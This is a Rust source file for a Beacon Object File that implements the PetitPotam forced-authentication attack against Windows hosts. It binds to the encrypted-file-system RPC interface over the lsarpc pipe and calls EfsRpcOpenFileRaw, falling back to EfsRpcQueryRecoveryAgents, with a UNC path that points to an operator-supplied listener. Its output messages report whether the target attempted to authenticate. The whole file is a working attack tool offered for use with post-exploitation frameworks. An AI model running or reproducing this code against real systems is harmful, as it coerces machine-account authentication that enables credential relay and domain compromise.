//! # PetitPotam BOF
//!
//! Calls the encrypted-file-system RPC interface over the remote `lsarpc`
//! named pipe and supplies a bounded UNC path. `EfsRpcOpenFileRaw` is attempted
//! first and `EfsRpcQueryRecoveryAgents` is used as the protocol-correct
//! fallback. Both calls use Microsoft NDR client contracts. Returned RPC
//! allocations and context handles are released before the BOF exits.
//!
//! ## MITRE ATT&CK
//! - T1187 - Forced Authentication
//!
//! ## Arguments
//! - `str`: Target server hostname or address.
//! - `str`: Listener hostname or address for the UNC path.

#![no_std]

use alloc::format;
use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem::size_of;
use rustbof::{eprintln, println};
use windows_sys::Win32::System::Com::{RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE};
use windows_sys::Win32::System::Memory::{GetProcessHeap, HEAP_ZERO_MEMORY, HeapAlloc, HeapFree};
use windows_sys::Win32::System::Rpc::{
    CLIENT_CALL_RETURN, MIDL_STUB_DESC, MIDL_STUB_DESC_0, NdrClientCall2, RPC_C_AUTHN_WINNT,
    RPC_C_AUTHZ_NONE, RPC_C_QOS_CAPABILITIES_DEFAULT, RPC_C_QOS_IDENTITY_STATIC,
    RPC_CLIENT_INTERFACE, RPC_S_OK, RPC_SECURITY_QOS, RPC_SYNTAX_IDENTIFIER, RPC_VERSION,
    RpcBindingFree, RpcBindingFromStringBindingW, RpcBindingSetAuthInfoExW,
    RpcStringBindingComposeW, RpcStringFreeW,
};
use windows_sys::core::GUID;

const ERROR_BAD_NETPATH: isize = 53;
const ERROR_BAD_NET_NAME: isize = 67;
const ERROR_LOGON_FAILURE: isize = 1326;
const RPC_IF_FLAG_SEC_NO_CACHE: u32 = 0x0200_0000;
const RPC_SECURITY_QOS_VERSION: u32 = 1;

// Generated locally from the Microsoft MS-EFSR interface definition with
// MIDL 8.01 for x64 Oi2 stubs. Procedure 0 is EfsRpcOpenFileRaw and procedure
// 3 is EfsRpcCloseRaw. The bytecode is declarative NDR metadata, not code.
static PROC_FORMAT: [u8; 193] = [
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00,
    0x40, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01,
    0x08, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00,
    0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00,
    0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x0a, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x14, 0x41, 0x08, 0x00,
    0x18, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
    0x18, 0x00, 0x30, 0x40, 0x00, 0x00, 0x00, 0x00, 0x24, 0x00, 0x08, 0x00, 0x4c, 0x03, 0x0a, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x0c, 0x01,
    0x08, 0x00, 0x26, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00,
    0x03, 0x00, 0x08, 0x00, 0x30, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x38, 0x00, 0x38, 0x00, 0x40, 0x01,
    0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x32, 0x00,
    0x00,
];

// Procedure 7 is EfsRpcQueryRecoveryAgents. It is kept separate so the
// existing OpenFileRaw and CloseRaw offsets remain obvious during review.
static QUERY_RECOVERY_AGENTS_PROC_FORMAT: [u8; 49] = [
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x47, 0x03, 0x0a, 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01,
    0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x36, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00,
    0x00,
];

static TYPE_FORMAT: [u8; 237] = [
    0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x30, 0x41,
    0x00, 0x00, 0x11, 0x04, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00,
    0x11, 0x00, 0x04, 0x00, 0x02, 0x5c, 0xb5, 0x00, 0xfc, 0xff, 0x01, 0x00, 0x01, 0x00, 0x11, 0x04,
    0x02, 0x00, 0x30, 0xe1, 0x00, 0x00, 0x11, 0x14, 0x02, 0x00, 0x12, 0x00, 0xa0, 0x00, 0x1d, 0x00,
    0x06, 0x00, 0x02, 0x5b, 0x15, 0x00, 0x06, 0x00, 0x4c, 0x00, 0xf4, 0xff, 0x5c, 0x5b, 0x1b, 0x03,
    0x04, 0x00, 0x04, 0x00, 0xf9, 0xff, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x08, 0x5b, 0x17, 0x03, 0x08, 0x00, 0xe6, 0xff, 0x02, 0x02, 0x4c, 0x00, 0xd6, 0xff,
    0x5c, 0x5b, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00,
    0x08, 0x40, 0x36, 0x5b, 0x12, 0x20, 0xdc, 0xff, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00,
    0x08, 0x40, 0x36, 0x36, 0x36, 0x5b, 0x12, 0x00, 0xbc, 0xff, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x08,
    0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x11, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0xf4, 0x01, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0xc0, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00,
    0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x20, 0xc8, 0xff, 0x00,
];

#[repr(C)]
struct EfsrHashBlob {
    data_length: u32,
    data: *mut u8,
}

#[repr(C)]
struct EfsrEncryptionCertificateHash {
    total_length: u32,
    user_sid: *mut u8,
    hash: *mut EfsrHashBlob,
    display_information: *mut u16,
}

#[repr(C)]
struct EfsrEncryptionCertificateHashList {
    count: u32,
    users: *mut *mut EfsrEncryptionCertificateHash,
}

struct RecoveryAgents(*mut EfsrEncryptionCertificateHashList);

impl Drop for RecoveryAgents {
    fn drop(&mut self) {
        if self.0.is_null() {
            return;
        }

        unsafe {
            let list = &*self.0;
            if list.count <= 500 && !list.users.is_null() {
                for index in 0..list.count as usize {
                    let user = *list.users.add(index);
                    if user.is_null() {
                        continue;
                    }

                    let user = &*user;
                    if !user.user_sid.is_null() {
                        ndr_free(user.user_sid.cast());
                    }
                    if !user.hash.is_null() {
                        let hash = &*user.hash;
                        if !hash.data.is_null() {
                            ndr_free(hash.data.cast());
                        }
                        ndr_free(user.hash.cast());
                    }
                    if !user.display_information.is_null() {
                        ndr_free(user.display_information.cast());
                    }
                    ndr_free(
                        (user as *const EfsrEncryptionCertificateHash)
                            .cast_mut()
                            .cast(),
                    );
                }
                ndr_free(list.users.cast());
            }
            ndr_free(self.0.cast());
            self.0 = core::ptr::null_mut();
        }
    }
}

struct PackedArgs<'a> {
    buffer: &'a [u8],
    offset: usize,
}

impl<'a> PackedArgs<'a> {
    fn new(buffer: &'a [u8]) -> Option<Self> {
        let declared = u32::from_le_bytes(buffer.get(..4)?.try_into().ok()?) as usize;
        (declared == buffer.len().checked_sub(4)?).then_some(Self { buffer, offset: 4 })
    }

    fn string(&mut self, maximum: usize) -> Option<&'a str> {
        let length_end = self.offset.checked_add(4)?;
        let length =
            u32::from_le_bytes(self.buffer.get(self.offset..length_end)?.try_into().ok()?) as usize;
        self.offset = length_end;
        if length < 2 || length > maximum.checked_add(1)? {
            return None;
        }
        let value_end = self.offset.checked_add(length)?;
        let value = self.buffer.get(self.offset..value_end)?;
        self.offset = value_end;
        if value.last().copied() != Some(0) || value[..length - 1].contains(&0) {
            return None;
        }
        core::str::from_utf8(&value[..length - 1]).ok()
    }

    fn done(&self) -> bool {
        self.offset == self.buffer.len()
    }
}

struct Binding(*mut c_void);

impl Drop for Binding {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { RpcBindingFree(&mut self.0) };
        }
    }
}

fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(core::iter::once(0)).collect()
}

fn valid_host(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 253
        && !value.starts_with('.')
        && !value.ends_with('.')
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.'))
}

unsafe extern "system" fn ndr_allocate(size: usize) -> *mut c_void {
    unsafe { HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size) }
}

unsafe extern "system" fn ndr_free(pointer: *mut c_void) {
    if !pointer.is_null() {
        unsafe { HeapFree(GetProcessHeap(), 0, pointer) };
    }
}

fn rpc_interface() -> RPC_CLIENT_INTERFACE {
    RPC_CLIENT_INTERFACE {
        Length: size_of::<RPC_CLIENT_INTERFACE>() as u32,
        InterfaceId: RPC_SYNTAX_IDENTIFIER {
            SyntaxGUID: GUID::from_u128(0xc681d488_d850_11d0_8c52_00c04fd90f7e),
            SyntaxVersion: RPC_VERSION {
                MajorVersion: 1,
                MinorVersion: 0,
            },
        },
        TransferSyntax: RPC_SYNTAX_IDENTIFIER {
            SyntaxGUID: GUID::from_u128(0x8a885d04_1ceb_11c9_9fe8_08002b104860),
            SyntaxVersion: RPC_VERSION {
                MajorVersion: 2,
                MinorVersion: 0,
            },
        },
        DispatchTable: core::ptr::null_mut(),
        RpcProtseqEndpointCount: 0,
        RpcProtseqEndpoint: core::ptr::null_mut(),
        Reserved: 0,
        InterpreterInfo: core::ptr::null(),
        Flags: RPC_IF_FLAG_SEC_NO_CACHE | 1,
    }
}

fn stub_descriptor(
    interface: &mut RPC_CLIENT_INTERFACE,
    auto_handle: &mut *mut c_void,
) -> MIDL_STUB_DESC {
    MIDL_STUB_DESC {
        RpcInterfaceInformation: interface as *mut _ as *mut c_void,
        pfnAllocate: Some(ndr_allocate),
        pfnFree: Some(ndr_free),
        IMPLICIT_HANDLE_INFO: MIDL_STUB_DESC_0 {
            pAutoHandle: auto_handle,
        },
        apfnNdrRundownRoutines: core::ptr::null(),
        aGenericBindingRoutinePairs: core::ptr::null(),
        apfnExprEval: core::ptr::null(),
        aXmitQuintuple: core::ptr::null(),
        pFormatTypes: TYPE_FORMAT.as_ptr(),
        fCheckBounds: 1,
        Version: 0x0006_0001,
        pMallocFreeStruct: core::ptr::null_mut(),
        MIDLVersion: 0x0801_0274,
        CommFaultOffsets: core::ptr::null(),
        aUserMarshalQuadruple: core::ptr::null(),
        NotifyRoutineTable: core::ptr::null(),
        mFlags: 0x0200_0001,
        CsRoutineTables: core::ptr::null(),
        ProxyServerInfo: core::ptr::null_mut(),
        pExprInfo: core::ptr::null(),
    }
}

fn bind(server: &str) -> Result<Binding, i32> {
    let protocol = wide("ncacn_np");
    let server = wide(server.trim_start_matches('\\'));
    let endpoint = wide(r"\pipe\lsarpc");
    let mut string_binding = core::ptr::null_mut();
    let status = unsafe {
        RpcStringBindingComposeW(
            core::ptr::null(),
            protocol.as_ptr(),
            server.as_ptr(),
            endpoint.as_ptr(),
            core::ptr::null(),
            &mut string_binding,
        )
    };
    if status != RPC_S_OK {
        return Err(status);
    }

    let mut handle = core::ptr::null_mut();
    let status = unsafe { RpcBindingFromStringBindingW(string_binding, &mut handle) };
    unsafe { RpcStringFreeW(&mut string_binding) };
    if status != RPC_S_OK {
        return Err(status);
    }
    let binding = Binding(handle);
    let qos = RPC_SECURITY_QOS {
        Version: RPC_SECURITY_QOS_VERSION,
        Capabilities: RPC_C_QOS_CAPABILITIES_DEFAULT,
        IdentityTracking: RPC_C_QOS_IDENTITY_STATIC,
        ImpersonationType: RPC_C_IMP_LEVEL_IMPERSONATE,
    };
    let status = unsafe {
        RpcBindingSetAuthInfoExW(
            binding.0,
            core::ptr::null(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_AUTHN_WINNT,
            core::ptr::null(),
            RPC_C_AUTHZ_NONE,
            &qos,
        )
    };
    if status != RPC_S_OK {
        return Err(status);
    }
    Ok(binding)
}

fn open_raw(binding: &Binding, path: &mut [u16]) -> (isize, *mut c_void) {
    let mut interface = rpc_interface();
    let mut auto_handle = core::ptr::null_mut();
    let mut stub = stub_descriptor(&mut interface, &mut auto_handle);
    let mut context = core::ptr::null_mut();
    let result: CLIENT_CALL_RETURN = unsafe {
        NdrClientCall2(
            &mut stub,
            PROC_FORMAT.as_ptr() as *mut u8,
            binding.0,
            &mut context,
            path.as_mut_ptr(),
            0i32,
        )
    };
    (unsafe { result.Simple }, context)
}

fn close_raw(context: &mut *mut c_void) {
    if (*context).is_null() {
        return;
    }
    let mut interface = rpc_interface();
    let mut auto_handle = core::ptr::null_mut();
    let mut stub = stub_descriptor(&mut interface, &mut auto_handle);
    unsafe {
        NdrClientCall2(&mut stub, PROC_FORMAT.as_ptr().add(154) as *mut u8, context);
    }
}

fn query_recovery_agents(binding: &Binding, path: &mut [u16]) -> (isize, RecoveryAgents) {
    let mut interface = rpc_interface();
    let mut auto_handle = core::ptr::null_mut();
    let mut stub = stub_descriptor(&mut interface, &mut auto_handle);
    let mut agents = core::ptr::null_mut();
    let result: CLIENT_CALL_RETURN = unsafe {
        NdrClientCall2(
            &mut stub,
            QUERY_RECOVERY_AGENTS_PROC_FORMAT.as_ptr() as *mut u8,
            binding.0,
            path.as_mut_ptr(),
            &mut agents,
        )
    };
    (unsafe { result.Simple }, RecoveryAgents(agents))
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let parsed = if args.is_null() || len == 0 {
        None
    } else {
        let buffer = unsafe { core::slice::from_raw_parts(args, len) };
        PackedArgs::new(buffer).and_then(|mut parser| {
            let target = parser.string(253)?;
            let listener = parser.string(253)?;
            parser.done().then_some((target, listener))
        })
    };
    let Some((target, listener)) = parsed else {
        eprintln!("Usage: petitpotam <target> <listener>");
        return;
    };
    if !valid_host(target) || !valid_host(listener) {
        eprintln!("Target and listener must be valid hostnames or IPv4 addresses.");
        return;
    }

    let binding = match bind(target) {
        Ok(binding) => binding,
        Err(status) => {
            eprintln!("EFSRPC binding failed: 0x{:X}", status);
            return;
        }
    };
    let mut path = wide(&format!(r"\\{}\share\probe", listener));
    let (open_status, mut context) = open_raw(&binding, &mut path);
    close_raw(&mut context);

    if matches!(open_status, ERROR_BAD_NETPATH | ERROR_BAD_NET_NAME) {
        println!(
            "EfsRpcOpenFileRaw reached {} and attempted the remote UNC path (status {}).",
            target, open_status
        );
        return;
    }

    let (query_status, _agents) = query_recovery_agents(&binding, &mut path);
    if matches!(query_status, ERROR_BAD_NETPATH | ERROR_BAD_NET_NAME) {
        println!(
            "EfsRpcQueryRecoveryAgents reached {} and attempted the remote UNC path (OpenFileRaw status {}, fallback status {}).",
            target, open_status, query_status
        );
    } else if query_status == ERROR_LOGON_FAILURE {
        eprintln!(
            "EfsRpcQueryRecoveryAgents reached {} but authentication to the supplied UNC path failed (OpenFileRaw status {}, fallback status {}).",
            target, open_status, query_status
        );
    } else {
        println!(
            "EFSRPC completed against {} without a coercion-indicating status (OpenFileRaw {}, QueryRecoveryAgents {}). Confirm listener telemetry before claiming forced authentication.",
            target, open_status, query_status
        );
    }
}
